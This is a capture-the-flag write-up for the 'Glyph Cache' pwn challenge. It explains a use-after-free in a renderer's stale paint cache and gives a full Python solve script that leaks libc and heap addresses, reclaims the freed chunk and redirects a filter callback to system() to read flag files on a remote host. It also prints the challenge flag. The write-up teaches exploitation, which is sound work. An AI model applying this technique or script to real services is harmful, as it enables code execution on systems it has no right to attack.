---
title: Glyph Cache
date: 2026-07-06
tags:
- pwn
- LYKNCTF
---

- **Challenge:** Glyph Cache
- **Category:** Pwn
- **Flag:** `LYKNCTF{i_hope_you_love_it_https://open.spotify.com/track/7wyBHQWBpLJAPczbzcZ8PU?si=4f200d018d6845a3}`

---

## My initial read / first impressions

The challenge description says:

```text
I hope this easy enough for beginners to solve :D
```

Connecting to the service gives a tiny headless renderer shell:

```text
GlyphCache headless renderer
commands:
  load <text>
  style [name]
  layout
  paint
  theme <name>
  optimize
  profile add <hex bytes>
  inspect paint raw
  render
  epochs
  reset
  help
  quit
glyph>
```

So this was not a normal "send a huge string and smash the stack" pwn challenge. It looked more like we had to abuse the renderer's internal state: load some text, build style/layout/paint caches, optimize something, then somehow get `render` to use corrupted cached data.

The word **cache** in the challenge name was a pretty big hint. If a renderer caches objects across rebuilds, the bug is probably stale data: a cached pointer that stays alive after the object it points to gets freed.

## Understanding the renderer flow

The normal flow is:

```text
load <text>
style <theme>
layout
paint
render
```

`load` stores the text that will eventually be rendered. `style` builds a style object. `layout` builds the layout tree. `paint` builds a display list from that layout/style information. Finally, `render` walks the paint cache and draws the text.

The important behavior shows up when rebuilding the style and then optimizing:

```text
style a
layout
paint
style b
optimize
```

After the second `style`, the style epoch changes, but the old paint cache is still around. Then `optimize` says:

```text
[optimize] paint cache kept: layout hash unchanged
[optimize] compacted retired style arena 0
```

That is the bug. The paint cache is kept because the layout hash did not change, but the style arena it references is retired and compacted/freed. So the paint list still has a pointer to an old style object that is no longer valid.

In other words:

```text
paint cache
  -> points at old style object
style b
  -> creates new style arena
optimize
  -> frees old style arena
paint cache
  -> still points at freed style object
```

That gives us a use-after-free.

## Getting a leak

The challenge gives us a very helpful debug command:

```text
inspect paint raw
```

After freeing the old style arena, this command dumps the raw bytes from the stale cached style pointer. Since the freed chunk is large enough to end up in libc allocator metadata, the first qwords become useful pointers.

The output looked like this:

```text
[inspect] paint[0] node=1 text_len=42 raw=202b9cb8d875000010878f8555550000...
```

Parsing the first two qwords gave:

```text
libc leak  = 0x75d8b89c2b20
heap bk    = 0x5555858f8710
```

The libc leak is an unsorted-bin style pointer, so subtracting the known offset from the provided libc gives the libc base:

```python
LIBC_UNSORTED_FD_OFF = 0x203b20
LIBC_SYSTEM_OFF = 0x58750

libc_base = libc_leak - LIBC_UNSORTED_FD_OFF
system_addr = libc_base + LIBC_SYSTEM_OFF
```

That gives us the address of `system()`.

The second leaked pointer helps recover where the stale style object used to live on the heap. For this allocation layout, the stale style pointer was:

```python
stale_style = heap_bk - 0x460
```

## Reclaiming the freed style chunk

The other very suspicious command is:

```text
profile add <hex bytes>
```

This stores attacker-controlled bytes in a heap allocation. Since the old style arena was just freed, `profile add` can reclaim that freed chunk. That means the stale paint-cache pointer now points into memory we control.

So the plan becomes:

```text
1. Build a paint cache that points to style object A.
2. Rebuild style so object A becomes retired.
3. Optimize to free object A while keeping the paint cache.
4. Leak libc/heap pointers from the freed chunk.
5. Use profile add to reclaim that chunk with fake style/filter data.
6. Call render so it uses the stale cached pointer.
```

## Faking the filter callback

The renderer has a filter object with a magic value and a function pointer. The fake object I used looked like this:

```python
MAGIC = b"GYPHFLIF"

fake_filter = stale_style_addr + 0x40

payload = bytearray(0x80)

# Fake ComputedStyle-ish object.
payload[0x00:0x08] = p64(1)
payload[0x08:0x10] = p64(1)
payload[0x10:0x18] = p64(fake_filter)

# Fake filter object.
payload[0x40:0x48] = MAGIC
payload[0x48:0x50] = p64(system_addr)
```

The first part fakes the cached style object and points its filter field at the fake filter. The second part fakes the filter itself and replaces the callback with `system()`.

Then I made the loaded text be the command I wanted `system()` to run:

```text
cat flag* /flag* /home/*/flag* 2>/dev/null
```

When `render` tries to process the cached filter, it calls the filter callback on the loaded text. Since the callback is now `system`, the renderer ends up running:

```text
system("cat flag* /flag* /home/*/flag* 2>/dev/null")
```

That prints the flag.

## Exploitation

This is the full solve script I used:

```python
#!/usr/bin/env python3
import re
import os
import sys
import time
import socket
import struct
import select
import subprocess

HOST = "15.235.202.47"
PORT = 9001
PROMPT = b"glyph> "

# Offsets from the provided libc.so.6
LIBC_UNSORTED_FD_OFF = 0x203b20
LIBC_SYSTEM_OFF = 0x58750

MAGIC = b"GYPHFLIF"


def p64(x):
    return struct.pack("<Q", x & 0xffffffffffffffff)


def u64(x):
    return struct.unpack("<Q", x.ljust(8, b"\x00"))[0]


class Tube:
    def __init__(self, local=False):
        self.local = local
        self.buf = b""

        if local:
            self.p = subprocess.Popen(
                ["./run.sh"],
                cwd="./public",
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                bufsize=0,
            )
        else:
            self.s = socket.create_connection((HOST, PORT), timeout=8)
            self.s.settimeout(0.2)

    def _read_once(self):
        if self.local:
            r, _, _ = select.select([self.p.stdout], [], [], 0.2)
            if not r:
                return b""
            return os.read(self.p.stdout.fileno(), 4096)

        try:
            return self.s.recv(4096)
        except socket.timeout:
            return b""

    def recv_until(self, delim=PROMPT, timeout=5):
        end = time.time() + timeout

        while delim not in self.buf and time.time() < end:
            chunk = self._read_once()
            if chunk:
                self.buf += chunk

        if delim in self.buf:
            idx = self.buf.index(delim) + len(delim)
            out = self.buf[:idx]
            self.buf = self.buf[idx:]
            return out

        out = self.buf
        self.buf = b""
        return out

    def sendline(self, data):
        if isinstance(data, str):
            data = data.encode()

        if self.local:
            self.p.stdin.write(data + b"\n")
            self.p.stdin.flush()
        else:
            self.s.sendall(data + b"\n")

    def cmd(self, data, timeout=5, show=True):
        self.sendline(data)
        out = self.recv_until(timeout=timeout)
        if show:
            print(out.decode(errors="replace"), end="")
        return out


def build_fake_style(system_addr, stale_style_addr):
    fake_filter = stale_style_addr + 0x40

    payload = bytearray(0x80)

    payload[0x00:0x08] = p64(1)
    payload[0x08:0x10] = p64(1)
    payload[0x10:0x18] = p64(fake_filter)

    payload[0x40:0x48] = MAGIC
    payload[0x48:0x50] = p64(system_addr)

    return payload


def main():
    local = "--local" in sys.argv

    t = Tube(local=local)
    print(t.recv_until().decode(errors="replace"), end="")

    command = b"cat flag* /flag* /home/*/flag* 2>/dev/null"

    t.cmd(b"load " + command)
    t.cmd("style a")
    t.cmd("layout")
    t.cmd("paint")

    # Rebuilding style retires the old style arena, but the paint cache still points to it.
    t.cmd("style b")

    # This frees/compacts the retired style arena while keeping the stale paint cache.
    t.cmd("optimize")

    leak_out = t.cmd("inspect paint raw")
    m = re.search(rb"raw=([0-9a-fA-F]+)", leak_out)
    if not m:
        raise RuntimeError("Failed to leak paint cache raw bytes")

    raw = bytes.fromhex(m.group(1).decode())

    libc_leak = u64(raw[0x00:0x08])
    heap_bk = u64(raw[0x08:0x10])

    libc_base = libc_leak - LIBC_UNSORTED_FD_OFF
    system_addr = libc_base + LIBC_SYSTEM_OFF

    stale_style = heap_bk - 0x460

    print(f"[+] libc leak  = {libc_leak:#x}")
    print(f"[+] libc base  = {libc_base:#x}")
    print(f"[+] system     = {system_addr:#x}")
    print(f"[+] heap bk    = {heap_bk:#x}")
    print(f"[+] stale style= {stale_style:#x}")

    payload = build_fake_style(system_addr, stale_style)
    t.cmd(b"profile add " + payload.hex().encode())

    print("[+] Triggering system(command)...")
    out = t.cmd("render", timeout=10)

    flag = re.search(rb"LYKNCTF\{[^\r\n}]+\}", out)
    if flag:
        print("\n[+] FLAG:", flag.group(0).decode())
    else:
        print("\n[-] Flag not found in output. Full render output above.")


if __name__ == "__main__":
    main()
```

Running it against the remote gives:

```text
[+] libc leak  = 0x75d8b89c2b20
[+] libc base  = 0x75d8b87bf000
[+] system     = 0x75d8b8817750
[+] heap bk    = 0x5555858f8710
[+] stale style= 0x5555858f82b0
[profile] stored page=0 bytes=128
glyph> [+] Triggering system(command)...
LYKNCTF{i_hope_you_love_it_https://open.spotify.com/track/7wyBHQWBpLJAPczbzcZ8PU?si=4f200d018d6845a3}
glyph>
[+] FLAG: LYKNCTF{i_hope_you_love_it_https://open.spotify.com/track/7wyBHQWBpLJAPczbzcZ8PU?si=4f200d018d6845a3}
```

## Why this works

The renderer tries to be smart by keeping the paint cache when the layout hash does not change. The problem is that the paint cache does not only depend on the layout. It also contains a pointer to style/filter data.

When the style is rebuilt and the old style arena is compacted, the cached pointer becomes stale. The program then lets us both inspect that stale memory and reallocate over it with controlled bytes.

The final exploit chain is:

```text
load command text
  -> build style/layout/paint
  -> rebuild style
  -> optimize frees old style arena but keeps paint cache
  -> inspect stale freed chunk to leak libc + heap
  -> profile add reclaims freed style memory
  -> fake style points to fake filter
  -> fake filter callback = system
  -> render calls system(command)
  -> flag prints
```

So the challenge is a use-after-free in the renderer cache. The bug is not that `render` directly accepts commands. The bug is that `render` trusts a cached filter callback pointer after the memory behind it has been freed and replaced with attacker-controlled data.

## Flag

```text
LYKNCTF{i_hope_you_love_it_https://open.spotify.com/track/7wyBHQWBpLJAPczbzcZ8PU?si=4f200d018d6845a3}
```
